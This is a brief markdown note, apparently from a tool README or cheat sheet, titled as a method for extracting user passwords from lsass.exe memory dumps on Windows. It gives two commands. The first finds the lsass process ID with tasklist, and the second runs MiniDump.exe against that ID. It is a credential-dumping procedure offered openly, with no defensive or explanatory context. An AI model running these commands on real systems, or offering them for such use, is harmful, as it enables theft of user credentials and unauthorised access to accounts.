# Extracting user passwords from lsass.exe dumps

Get the PID of the lsass process with `tasklist`

```
tasklist /FI "IMAGENAME eq lsass.exe"
```

Run MiniDump.exe with the PID of lsass.exe as the first argument.

```
MiniDump.exe <PID>
```